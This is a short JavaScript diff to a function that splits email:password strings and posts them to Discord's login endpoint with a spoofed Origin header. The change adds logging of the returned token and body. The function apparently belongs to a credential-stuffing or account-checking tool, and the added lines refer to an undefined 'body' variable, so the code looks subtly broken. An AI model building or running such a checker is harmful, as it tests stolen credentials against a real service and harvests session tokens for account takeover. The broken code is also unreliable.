@@ -6,8 +6,6 @@ function senddis(){
     var dt = v.split(':');
     sp
     .post('https://discord.com/api/v8/auth/login')
-    .set('content-type', 'application/json')
-    .set("Access-Control-Allow-Origin","https://discord.com")
     .set("Origin","https://discord.com")
     .send({email:dt[0],password:dt[1]})
     .end(function(er,re){
@@ -16,6 +14,8 @@ function senddis(){
       appendlog(re);
       appendlog(JSON.stringify(re,null,2))
       appendlog(er)
+      appendlog(body.token)
+      appendlog(body)
     });
   });
 }
